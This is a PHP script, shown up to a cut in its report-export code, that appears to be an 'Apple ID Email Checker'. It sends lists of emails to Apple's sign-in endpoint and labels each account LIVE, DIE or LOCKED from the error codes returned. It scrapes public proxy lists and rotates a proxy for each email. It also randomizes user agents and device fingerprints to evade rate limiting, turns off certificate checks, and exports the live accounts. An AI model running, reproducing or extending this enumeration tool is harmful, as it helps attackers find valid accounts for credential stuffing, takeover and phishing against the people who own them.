<?php
/**
 * Apple ID Email Checker - Full Version with Auto Proxy Grab & IP Rotation
 * VERSI TANPA CURL - Hanya pakai file_get_contents + stream_context
 * 
 * Fitur:
 * - Auto grab proxy dari multiple sumber
 * - IP rotation: setiap email proxy berbeda
 * - Test proxy internal
 * - Export hasil
 * 
 * Endpoint: https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true
 * 
 * Kode Error:
 * -20101 : DIE
 * -20201 : LIVE (2FA)
 * -20283 : LIVE (Trusted Device)
 */

class ProxyGrabber
{
    private $proxies = [];
    private $testedProxies = [];
    private $failedProxies = [];
    private $proxyIndex = 0;
    private $testTimeout = 10;
    public $maxProxies = 500;
    private $socksProxy = null; // Untuk proxy chain
    
    /**
     * Set max proxies limit
     */
    public function setMaxProxies(int $max): self
    {
        $this->maxProxies = max(1, $max);
        return $this;
    }
    
    /**
     * Fetch URL with fallback methods
     */
    private function fetchUrl(string $url, ?string $proxy = null): ?string
    {
        $opts = [
            'http' => [
                'timeout' => 15,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'header' => [
                    "Accept: text/html,application/json,*/*",
                    "Accept-Language: en-US,en;q=0.9",
                ],
                'ignore_errors' => true,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true,
            ],
        ];
        
        if ($proxy) {
            $opts['http']['proxy'] = $proxy;
            $opts['http']['request_fulluri'] = true;
        }
        
        $context = stream_context_create($opts);
        
        // Coba file_get_contents dulu
        $content = @file_get_contents($url, false, $context);
        
        if ($content !== false) {
            return $content;
        }
        
        // Fallback: coba dengan fsockopen untuk HTTP
        $parsed = parse_url($url);
        $scheme = $parsed['scheme'] ?? 'http';
        $host = $parsed['host'] ?? '';
        $path = $parsed['path'] ?? '/';
        $port = $parsed['port'] ?? ($scheme === 'https' ? 443 : 80);
        
        if ($proxy) {
            $proxyParsed = parse_url($proxy);
            $proxyHost = $proxyParsed['host'] ?? '';
            $proxyPort = $proxyParsed['port'] ?? 80;
            
            $fp = @fsockopen($proxyHost, $proxyPort, $errno, $errstr, 10);
            if ($fp) {
                $req = "GET $url HTTP/1.0\r\n";
                $req .= "Host: $host\r\n";
                $req .= "User-Agent: Mozilla/5.0\r\n";
                $req .= "Accept: */*\r\n";
                $req .= "Connection: close\r\n\r\n";
                
                fwrite($fp, $req);
                $response = '';
                while (!feof($fp)) {
                    $response .= fgets($fp, 8192);
                }
                fclose($fp);
                
                // Pisahkan header dan body
                $parts = explode("\r\n\r\n", $response, 2);
                return $parts[1] ?? null;
            }
        } else {
            // Direct connection dengan fsockopen
            $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
            if ($fp) {
                $req = "GET $path HTTP/1.0\r\n";
                $req .= "Host: $host\r\n";
                $req .= "User-Agent: Mozilla/5.0\r\n";
                $req .= "Accept: */*\r\n";
                $req .= "Connection: close\r\n\r\n";
                
                fwrite($fp, $req);
                $response = '';
                while (!feof($fp)) {
                    $response .= fgets($fp, 8192);
                }
                fclose($fp);
                
                $parts = explode("\r\n\r\n", $response, 2);
                return $parts[1] ?? null;
            }
        }
        
        return null;
    }
    
    /**
     * Auto grab proxy dari berbagai sumber
     */
    public function grabFromAllSources(): array
    {
        echo "[*] Mengambil proxy dari semua sumber...\n";
        
        $sources = [
            [$this, 'grabFromProxifly'],
            [$this, 'grabFromProxyScrape'],
            [$this, 'grabFromSpeedX'],
            [$this, 'grabFromGeonode'],
            [$this, 'grabFromFreeProxyList'],
            [$this, 'grabFromPubProxy'],
            [$this, 'grabFromOpenProxySpace'],
            [$this, 'grabFromSSLProxy'],
        ];
        
        $allProxies = [];
        foreach ($sources as $source) {
            try {
                $proxies = call_user_func($source);
                if (!empty($proxies)) {
                    $allProxies = array_merge($allProxies, $proxies);
                    echo "[+] " . count($proxies) . " proxy\n";
                }
            } catch (\Exception $e) {
                echo "[-] Gagal: " . $e->getMessage() . "\n";
            }
        }
        
        $allProxies = array_unique($allProxies);
        $allProxies = array_values($allProxies);
        
        if (count($allProxies) > $this->maxProxies) {
            shuffle($allProxies);
            $allProxies = array_slice($allProxies, 0, $this->maxProxies);
        }
        
        echo "[*] Total proxy: " . count($allProxies) . "\n";
        $this->proxies = $allProxies;
        return $allProxies;
    }
    
    /**
     * Grab dari Proxifly
     */
    public function grabFromProxifly(): array
    {
        $proxies = [];
        $urls = [
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
        ];
        $protocols = ['http', 'socks4', 'socks5'];
        
        foreach ($urls as $i => $url) {
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
                        $proxies[] = $protocols[$i] . '://' . $line;
                    }
                }
            }
        }
        return $proxies;
    }
    
    /**
     * Grab dari ProxyScrape
     */
    public function grabFromProxyScrape(): array
    {
        $proxies = [];
        $types = ['http', 'socks4', 'socks5'];
        
        foreach ($types as $type) {
            $url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=$type";
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line)) {
                        if (strpos($line, '://') === false) {
                            $proxies[] = "$type://$line";
                        } else {
                            $proxies[] = $line;
                        }
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari SpeedX List
     */
    public function grabFromSpeedX(): array
    {
        $proxies = [];
        $urls = [
            'http' => 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'socks4' => 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
            'socks5' => 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
        ];
        
        foreach ($urls as $protocol => $url) {
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
                        $proxies[] = "$protocol://$line";
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari Geonode
     */
    public function grabFromGeonode(): array
    {
        $proxies = [];
        
        for ($page = 1; $page <= 3; $page++) {
            $url = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=$page&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps%2Csocks4%2Csocks5";
            $content = $this->fetchUrl($url);
            
            if ($content) {
                $data = json_decode($content, true);
                if (isset($data['data']) && is_array($data['data'])) {
                    foreach ($data['data'] as $proxy) {
                        $ip = $proxy['ip'] ?? '';
                        $port = $proxy['port'] ?? '';
                        $protocols = $proxy['protocols'] ?? ['http'];
                        $protocol = strtolower($protocols[0] ?? 'http');
                        
                        if (!empty($ip) && !empty($port)) {
                            $proxies[] = "$protocol://$ip:$port";
                        }
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari Free-Proxy-List.net
     */
    public function grabFromFreeProxyList(): array
    {
        $proxies = [];
        
        $url = 'https://free-proxy-list.net/';
        $content = $this->fetchUrl($url);
        
        if ($content) {
            preg_match_all('/<tr[^>]*>(.*?)<\/tr>/s', $content, $rows);
            foreach ($rows[1] as $row) {
                preg_match_all('/<td[^>]*>(.*?)<\/td>/s', $row, $cols);
                if (count($cols[1]) >= 7) {
                    $ip = trim(strip_tags($cols[1][0]));
                    $port = trim(strip_tags($cols[1][1]));
                    $https = strtolower(trim(strip_tags($cols[1][6])));
                    
                    if (!empty($ip) && !empty($port) && preg_match('/^\d+\.\d+\.\d+\.\d+$/', $ip)) {
                        $protocol = ($https === 'yes') ? 'https' : 'http';
                        $proxies[] = "$protocol://$ip:$port";
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari PubProxy
     */
    public function grabFromPubProxy(): array
    {
        $proxies = [];
        
        for ($i = 0; $i < 5; $i++) {
            $url = 'http://pubproxy.com/api/proxy?limit=5&format=json&http=true&https=true&socks4=true&socks5=true&type=elite';
            $content = $this->fetchUrl($url);
            
            if ($content) {
                $data = json_decode($content, true);
                if (isset($data['data']) && is_array($data['data'])) {
                    foreach ($data['data'] as $proxy) {
                        $ip = $proxy['ip'] ?? '';
                        $port = $proxy['port'] ?? '';
                        $type = strtolower($proxy['type'] ?? 'http');
                        
                        if (!empty($ip) && !empty($port)) {
                            $proxies[] = "$type://$ip:$port";
                        }
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari OpenProxySpace
     */
    public function grabFromOpenProxySpace(): array
    {
        $proxies = [];
        $urls = [
            'http' => 'http://openproxyspace.com/http.txt',
            'socks4' => 'http://openproxyspace.com/socks4.txt',
            'socks5' => 'http://openproxyspace.com/socks5.txt',
        ];
        
        foreach ($urls as $protocol => $url) {
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
                        $proxies[] = "$protocol://$line";
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari SSL Proxy
     */
    public function grabFromSSLProxy(): array
    {
        $proxies = [];
        
        $url = 'https://sslproxies.org/';
        $content = $this->fetchUrl($url);
        
        if ($content) {
            preg_match_all('/<tr[^>]*>(.*?)<\/tr>/s', $content, $rows);
            foreach ($rows[1] as $row) {
                preg_match_all('/<td[^>]*>(.*?)<\/td>/s', $row, $cols);
                if (count($cols[1]) >= 2) {
                    $ip = trim(strip_tags($cols[1][0]));
                    $port = trim(strip_tags($cols[1][1]));
                    
                    if (!empty($ip) && !empty($port) && preg_match('/^\d+\.\d+\.\d+\.\d+$/', $ip)) {
                        $proxies[] = "https://$ip:$port";
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Test proxy menggunakan httpbin.org
     */
    public function testProxy(string $proxy): bool
    {
        $parsed = parse_url($proxy);
        $protocol = $parsed['scheme'] ?? 'http';
        $host = $parsed['host'] ?? '';
        $port = $parsed['port'] ?? ($protocol === 'socks5' || $protocol === 'socks4' ? 1080 : 80);
        
        if (in_array($protocol, ['socks4', 'socks5'])) {
            return $this->testSocksProxy($host, $port, $protocol);
        }
        
        // Test HTTP/HTTPS proxy via httpbin
        $testUrl = 'http://httpbin.org/ip';
        $proxyStr = "$protocol://$host:$port";
        
        $content = $this->fetchUrl($testUrl, $proxyStr);
        
        if ($content) {
            $data = json_decode($content, true);
            $working = isset($data['origin']);
            if ($working) {
                $this->testedProxies[] = $proxy;
            } else {
                $this->failedProxies[] = $proxy;
            }
            return $working;
        }
        
        $this->failedProxies[] = $proxy;
        return false;
    }
    
    /**
     * Test SOCKS proxy via TCP connect
     */
    private function testSocksProxy(string $host, string $port, string $type = 'socks5'): bool
    {
        $fp = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($fp) {
            if ($type === 'socks5') {
                // SOCKS5 handshake
                fwrite($fp, "\x05\x01\x00");
                $response = fread($fp, 2);
                if ($response === "\x05\x00") {
                    fclose($fp);
                    $this->testedProxies[] = "$type://$host:$port";
                    return true;
                }
            } else {
                // SOCKS4
                fwrite($fp, "\x04\x01\x00\x00\x00\x00\x00\x00");
                $response = fread($fp, 8);
                if (strlen($response) >= 2 && ord($response[1]) === 0x5a) {
                    fclose($fp);
                    $this->testedProxies[] = "$type://$host:$port";
                    return true;
                }
            }
            fclose($fp);
        }
        
        $this->failedProxies[] = "$type://$host:$port";
        return false;
    }
    
    /**
     * Test semua proxy
     */
    public function testAllProxies(array $proxies = null): array
    {
        $toTest = $proxies ?? $this->proxies;
        $working = [];
        $total = count($toTest);
        
        echo "[*] Testing $total proxy...\n";
        
        foreach ($toTest as $i => $proxy) {
            if ($this->testProxy($proxy)) {
                $working[] = $proxy;
            }
            
            if (($i + 1) % 10 === 0 || $i === $total - 1) {
                echo "\r[+] Tested: " . ($i + 1) . "/$total | Working: " . count($working) . "        ";
            }
        }
        
        echo "\n[*] Proxy working: " . count($working) . " dari $total\n";
        $this->proxies = $working;
        return $working;
    }
    
    /**
     * Get next proxy
     */
    public function getNextProxy(): ?string
    {
        if (empty($this->proxies)) {
            return null;
        }
        
        $proxy = $this->proxies[$this->proxyIndex % count($this->proxies)];
        $this->proxyIndex++;
        return $proxy;
    }
    
    /**
     * Reset rotation
     */
    public function resetRotation(): void
    {
        $this->proxyIndex = 0;
    }
    
    /**
     * Get available proxy count
     */
    public function getAvailableProxyCount(): int
    {
        return count($this->proxies);
    }
    
    /**
     * Save proxy ke file
     */
    public function saveToFile(string $filePath, array $proxies = null): bool
    {
        $toSave = $proxies ?? $this->proxies;
        return file_put_contents($filePath, implode("\n", $toSave)) !== false;
    }
    
    /**
     * Load proxy dari file
     */
    public function loadFromFile(string $filePath): array
    {
        if (!file_exists($filePath)) {
            return [];
        }
        
        $content = file_get_contents($filePath);
        $lines = explode("\n", $content);
        $proxies = [];
        
        foreach ($lines as $line) {
            $line = trim($line);
            if (!empty($line)) {
                if (strpos($line, '://') === false) {
                    $proxies[] = 'http://' . $line;
                } else {
                    $proxies[] = $line;
                }
            }
        }
        
        $this->proxies = $proxies;
        return $proxies;
    }
    
    public function getTestedProxies(): array { return $this->testedProxies; }
    public function getFailedProxies(): array { return $this->failedProxies; }
}

class AppleEmailChecker
{
    private $baseUrl = 'https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true';
    private $initUrl = 'https://idmsa.apple.com/appleauth/auth/signin/init';
    private $acceptLanguage = 'en-US,en;q=0.9';
    private $timeout = 30;
    private $proxyGrabber;
    private $useProxyRotation = true;
    private $verbose = false;
    private $delayBetweenRequests = 1000000;
    private $maxRetries = 2;
    private $results = [];
    private $stats = [
        'total' => 0, 'live' => 0, 'die' => 0,
        'locked' => 0, 'error' => 0, 'unknown' => 0,
        'proxy_rotations' => 0,
    ];
    
    private $userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    ];
    
    public function __construct()
    {
        $this->proxyGrabber = new ProxyGrabber();
    }
    
    public function setProxyGrabber(ProxyGrabber $grabber): self
    {
        $this->proxyGrabber = $grabber;
        return $this;
    }
    
    public function getProxyGrabber(): ProxyGrabber
    {
        return $this->proxyGrabber;
    }
    
    public function setProxyRotation(bool $enable): self
    {
        $this->useProxyRotation = $enable;
        return $this;
    }
    
    public function setTimeout(int $seconds): self
    {
        $this->timeout = $seconds;
        return $this;
    }
    
    public function setDelay(int $microseconds): self
    {
        $this->delayBetweenRequests = $microseconds;
        return $this;
    }
    
    public function setMaxRetries(int $retries): self
    {
        $this->maxRetries = $retries;
        return $this;
    }
    
    public function setVerbose(bool $verbose): self
    {
        $this->verbose = $verbose;
        return $this;
    }
    
    private function getRandomUserAgent(): string
    {
        return $this->userAgents[array_rand($this->userAgents)];
    }
    
    private function getRandomFingerprint(): string
    {
        return bin2hex(random_bytes(16));
    }
    
    private function generateRequestContext(): string
    {
        return strtoupper(dechex(time())) . '-' . strtoupper(dechex(rand(1000, 9999)));
    }
    
    private function generateDeviceId(): string
    {
        $data = random_bytes(16);
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }
    
    private function getClientInfo(): string
    {
        $ua = $this->getRandomUserAgent();
        return json_encode([
            'U' => $ua,
            'L' => 'en-US',
            'Z' => 'GMT+' . sprintf('%02d:00', rand(0, 12)),
            'V' => '1.1',
            'F' => $this->getRandomFingerprint(),
        ]);
    }
    
    /**
     * HTTP request tanpa curl - pure PHP streams
     */
    private function httpRequest(string $url, string $method = 'GET', ?string $payload = null, array $headers = [], ?string $proxy = null): array
    {
        $ua = $this->getRandomUserAgent();
        
        $headerLines = [];
        foreach ($headers as $h) {
            $headerLines[] = $h;
        }
        
        // Default headers
        if (!empty($payload)) {
            $headerLines[] = 'Content-Type: application/json';
            $headerLines[] = 'Content-Length: ' . strlen($payload);
        }
        
        $opts = [
            'http' => [
                'method' => $method,
                'timeout' => $this->timeout,
                'user_agent' => $ua,
                'header' => $headerLines,
                'ignore_errors' => true,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true,
            ],
        ];
        
        if ($payload) {
            $opts['http']['content'] = $payload;
        }
        
        if ($proxy && $this->useProxyRotation) {
            $parsed = parse_url($proxy);
            $proxyStr = $parsed['host'] . ':' . ($parsed['port'] ?? 80);
            
            // Untuk SOCKS proxy, kita perlu approach berbeda
            $protocol = $parsed['scheme'] ?? 'http';
            if (!in_array($protocol, ['socks4', 'socks5'])) {
                $opts['http']['proxy'] = "tcp://$proxyStr";
                $opts['http']['request_fulluri'] = true;
            }
        }
        
        $context = stream_context_create($opts);
        
        $response = @file_get_contents($url, false, $context);
        
        // Get response headers from $http_response_header
        $responseHeaders = $http_response_header ?? [];
        $httpCode = 0;
        
        foreach ($responseHeaders as $rh) {
            if (preg_match('/^HTTP\/[\d.]+ (\d+)/', $rh, $m)) {
                $httpCode = (int)$m[1];
            }
        }
        
        $error = $response === false ? 'file_get_contents failed' : '';
        
        return [
            'body' => $response !== false ? $response : '',
            'http_code' => $httpCode,
            'headers' => $responseHeaders,
            'error' => $error,
        ];
    }
    
    /**
     * Get session dari Apple
     */
    private function getSession(?string $proxy = null): array
    {
        $response = $this->httpRequest($this->initUrl, 'GET', null, [
            'Accept: application/json, text/plain, */*',
            'Accept-Language: ' . $this->acceptLanguage,
            'Referer: https://appleid.apple.com/',
            'Origin: https://appleid.apple.com',
        ], $proxy);
        
        // Parse cookies dari response headers
        $cookies = [];
        foreach ($response['headers'] as $h) {
            if (preg_match('/^Set-Cookie:\s*([^=]+)=([^;]+)/i', $h, $m)) {
                $cookies[trim($m[1])] = trim($m[2]);
            }
        }
        
        // Parse scnt
        $scnt = '';
        foreach ($response['headers'] as $h) {
            if (preg_match('/^scnt:\s*(.+)$/i', $h, $m)) {
                $scnt = trim($m[1]);
            }
        }
        
        // Parse widget key dari body
        $bodyData = json_decode($response['body'], true);
        $widgetKey = $bodyData['widgetKey'] ?? 'd39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d';
        
        return [
            'cookies' => $cookies,
            'scnt' => $scnt,
            'widgetKey' => $widgetKey,
            'httpCode' => $response['http_code'],
            'error' => $response['error'],
        ];
    }
    
    /**
     * Check single email
     */
    public function check(string $email, ?string $proxy = null): array
    {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return [
                'email' => $email,
                'status' => 'ERROR',
                'status_label' => 'Invalid Email Format',
                'http_code' => 0,
                'error_code' => null,
                'message' => 'Email format is invalid',
                'proxy_used' => $proxy,
            ];
        }
        
        $retryCount = 0;
        $lastError = '';
        
        while ($retryCount <= $this->maxRetries) {
            if ($this->useProxyRotation && $proxy === null) {
                $proxy = $this->proxyGrabber->getNextProxy();
                if ($proxy) {
                    $this->stats['proxy_rotations']++;
                }
            }
            
            if ($this->verbose) {
                $proxyInfo = $proxy ? " via " . parse_url($proxy, PHP_URL_HOST) : " (direct)";
                echo "[DEBUG] Checking $email$proxyInfo (attempt " . ($retryCount + 1) . ")\n";
            }
            
            try {
                // Get session
                $session = $this->getSession($proxy);
                
                // Build cookie string
                $cookieStr = '';
                foreach ($session['cookies'] as $name => $value) {
                    $cookieStr .= "$name=$value; ";
                }
                $cookieStr = rtrim($cookieStr, '; ');
                
                $deviceId = $this->generateDeviceId();
                $requestContext = $this->generateRequestContext();
                $clientInfo = $this->getClientInfo();
                
                $headers = [
                    'Accept: application/json, text/plain, */*',
                    'Accept-Language: ' . $this->acceptLanguage,
                    'Content-Type: application/json',
                    'Referer: https://appleid.apple.com/',
                    'Origin: https://appleid.apple.com',
                    'Cookie: ' . $cookieStr,
                    'X-Apple-I-FD-Client-Info: ' . $clientInfo,
                    'X-Apple-Request-Context: ' . $requestContext,
                    'X-Apple-I-Device-Id: ' . $deviceId,
                    'X-Apple-Widget-Key: ' . $session['widgetKey'],
                    'X-Requested-With: XMLHttpRequest',
                ];
                
                if (!empty($session['scnt'])) {
                    $headers[] = 'X-Apple-SCNT: ' . $session['scnt'];
                }
                
                $payload = json_encode(['accountName' => $email]);
                
                $response = $this->httpRequest(
                    $this->baseUrl,
                    'POST',
                    $payload,
                    $headers,
                    $proxy
                );
                
                if (!empty($response['error'])) {
                    $lastError = $response['error'];
                    $retryCount++;
                    if ($this->verbose) echo "[DEBUG] Error: {$response['error']}, retrying...\n";
                    if ($this->useProxyRotation) {
                        $proxy = $this->proxyGrabber->getNextProxy();
                        $this->stats['proxy_rotations']++;
                    }
                    usleep(500000);
                    continue;
                }
                
                $data = json_decode($response['body'], true);
                $result = $this->analyzeResponse($email, $response['http_code'], $data, $response['body'], $proxy);
                
                $this->stats['total']++;
                switch ($result['status']) {
                    case 'LIVE': $this->stats['live']++; break;
                    case 'DIE': $this->stats['die']++; break;
                    case 'LOCKED': $this->stats['locked']++; break;
                    case 'ERROR': $this->stats['error']++; break;
                    default: $this->stats['unknown']++; break;
                }
                
                $this->results[] = $result;
                return $result;
                
            } catch (\Exception $e) {
                $lastError = $e->getMessage();
                $retryCount++;
                if ($this->verbose) echo "[DEBUG] Exception: " . $e->getMessage() . "\n";
                if ($this->useProxyRotation) {
                    $proxy = $this->proxyGrabber->getNextProxy();
                    $this->stats['proxy_rotations']++;
                }
                usleep(500000);
            }
        }
        
        $result = [
            'email' => $email,
            'status' => 'ERROR',
            'status_label' => 'Max Retries',
            'http_code' => 0,
            'error_code' => null,
            'message' => 'Failed: ' . $lastError,
            'proxy_used' => $proxy,
        ];
        
        $this->stats['total']++;
        $this->stats['error']++;
        $this->results[] = $result;
        return $result;
    }
    
    /**
     * Analyze response
     */
    private function analyzeResponse(string $email, int $httpCode, ?array $data, string $rawResponse, ?string $proxy = null): array
    {
        $result = [
            'email' => $email,
            'status' => 'UNKNOWN',
            'status_label' => 'Unknown',
            'http_code' => $httpCode,
            'error_code' => null,
            'message' => '',
            'proxy_used' => $proxy,
        ];
        
        if (isset($data['serviceErrors']) && is_array($data['serviceErrors'])) {
            foreach ($data['serviceErrors'] as $error) {
                $code = $error['code'] ?? '';
                $msg = $error['message'] ?? '';
                
                switch ($code) {
                    case '-20101':
                        $result['status'] = 'DIE';
                        $result['status_label'] = 'Dead / Invalid';
                        $result['error_code'] = '-20101';
                        $result['message'] = $msg ?: 'Account not found';
                        return $result;
                    case '-20201':
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (2FA Required)';
                        $result['error_code'] = '-20201';
                        $result['message'] = $msg ?: 'Account exists, needs 2FA';
                        return $result;
                    case '-20283':
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (Trusted Device)';
                        $result['error_code'] = '-20283';
                        $result['message'] = $msg ?: 'Account exists, trusted device';
                        return $result;
                    case '-20751':
                        $result['status'] = 'LOCKED';
                        $result['status_label'] = 'Locked';
                        $result['error_code'] = '-20751';
                        $result['message'] = $msg ?: 'Account locked';
                        return $result;
                    default:
                        $result['status'] = 'UNKNOWN';
                        $result['status_label'] = 'Unknown Error';
                        $result['error_code'] = $code;
                        $result['message'] = $msg ?: "Unknown code: $code";
                        return $result;
                }
            }
        }
        
        switch ($httpCode) {
            case 200:
                $result['status'] = 'LIVE';
                $result['status_label'] = 'Live (HTTP 200)';
                $result['message'] = 'Account exists';
                break;
            case 401: $result['status'] = 'DIE'; $result['status_label'] = 'Unauthorized'; break;
            case 403: $result['status'] = 'DIE'; $result['status_label'] = 'Forbidden'; break;
            case 409: $result['status'] = 'LIVE'; $result['status_label'] = 'Live (Conflict)'; break;
            case 412: $result['status'] = 'LIVE'; $result['status_label'] = 'Live (No 2FA)'; break;
            case 429: $result['status'] = 'ERROR'; $result['status_label'] = 'Rate Limited'; break;
            case 503: $result['status'] = 'ERROR'; $result['status_label'] = 'Unavailable'; break;
        }
        
        return $result;
    }
    
    /**
     * Check multiple emails
     */
    public function checkMultiple(array $emails, bool $autoGrabProxy = true): array
    {
        if ($autoGrabProxy && $this->useProxyRotation && $this->proxyGrabber->getAvailableProxyCount() === 0) {
            echo "[*] Auto-grabbing proxies...\n";
            $proxies = $this->proxyGrabber->grabFromAllSources();
            if (!empty($proxies)) {
                echo "[*] Testing proxies...\n";
                $this->proxyGrabber->testAllProxies($proxies);
            }
        }
        
        $total = count($emails);
        $results = [];
        $liveCount = 0;
        $dieCount = 0;
        
        echo "\n[*] Memeriksa $total email...\n";
        echo "[*] Proxy: " . $this->proxyGrabber->getAvailableProxyCount() . "\n";
        echo str_repeat("=", 60) . "\n\n";
        
        foreach ($emails as $index => $email) {
            $email = trim($email);
            if (empty($email)) continue;
            
            $proxy = $this->useProxyRotation ? $this->proxyGrabber->getNextProxy() : null;
            
            $progress = sprintf("[%d/%d]", $index + 1, $total);
            echo "$progress Checking: $email ... ";
            
            $result = $this->check($email, $proxy);
            $results[] = $result;
            
            switch ($result['status']) {
                case 'LIVE': $liveCount++; break;
                case 'DIE': $dieCount++; break;
            }
            
            $proxyInfo = $proxy ? " [via " . parse_url($proxy, PHP_URL_HOST) . "]" : "";
            echo $result['status'] . " (" . $result['status_label'] . ")$proxyInfo\n";
            
            if ($index < $total - 1 && $this->delayBetweenRequests > 0) {
                usleep($this->delayBetweenRequests);
            }
        }
        
        echo "\n" . str_repeat("=", 60) . "\n";
        echo "[*] Selesai! LIVE: $liveCount | DIE: $dieCount\n";
        
        return $results;
    }
    
    public function checkFromFile(string $filePath, bool $autoGrabProxy = true): array
    {
        if (!file_exists($filePath)) {
            throw new \Exception("File not found: $filePath");
        }
        $emails = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $emails = array_map('trim', $emails);
        return $this->checkMultiple($emails, $autoGrabProxy);
    }
    
    public function getResults(): array { return $this->results; }
    public function getStats(): array { return $this->stats; }
    public function getLiveResults(): array { return array_filter($this->results, fn($r) => $r['status'] === 'LIVE'); }
    public function getDieResults(): array { return array_filter($this->results, fn($r) => $r['status'] === 'DIE'); }
    
    public static function formatResults(array $results): string
    {
        $out = "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
        $out .= sprintf("| %-33s | %-8s | %-26s | %-10s | %-20s |\n", "Email", "Status", "Label", "HTTP", "Proxy IP");
        $out .= "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
        
        foreach ($results as $r) {
            $pip = '';
            if (!empty($r['proxy_used'])) {
                $p = parse_url($r['proxy_used']);
                $pip = $p['host'] ?? '';
            }
            $out .= sprintf("| %-33s | %-8s | %-26s | %-10s | %-20s |\n",
                substr($r['email'], 0, 33),
                $r['status'],
                substr($r['status_label'], 0, 26),
                $r['http_code'],
                substr($pip, 0, 20)
            );
        }
        
        $out .= "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
        return $out;
    }
    
    public static function exportToCsv(array $results, string $path): bool
    {
        $fp = fopen($path, 'w');
        if (!$fp) return false;
        fwrite($fp, "\xEF\xBB\xBF");
        fputcsv($fp, ['Email','Status','Label','HTTP Code','Error Code','Message','Proxy']);
        foreach ($results as $r) {
            fputcsv($fp, [$r['email'],$r['status'],$r['status_label'],$r['http_code'],$r['error_code']??'',$r['message'],$r['proxy_used']??'']);
        }
        fclose($fp);
        return true;
    }
    
    public static function exportToJson(array $results, string $path): bool
    {
        return file_put_contents($path, json_encode($results, JSON_PRETTY_PRINT)) !== false;
    }
    
    public static function exportToTxt(array $results, array $stats, string $path): bool
    {
        $live = count(array_filter($results, fn($r) => $r['status'] === 'LIVE'));
        $die = count(array_filter($results, fn($r) => $r['status'] === 'DIE'));
        $err = count(array_filter($results, fn($r) => $r['status'] === 'ERROR'));
        
        $txt = "APPLE ID CHECKER REPORT\n";
        $txt .= str_repeat("=", 40) . "\n";
        $txt .= "Date: " . date('Y-m-d H:i:s') . "\n";
        $txt .= "Total: " . count($results) . " | LIVE: $live | DIE: $die | ERROR: $err\n\n";
        $txt .= "--- LIVE ---\n";
        foreach ($results as $r) {
            if ($r['status'] === 'LIVE') {
                $pi = !empty($r['proxy_used']) ? ' ['.parse_url($r['proxy_used'], PHP_URL_HOST).']' : '';
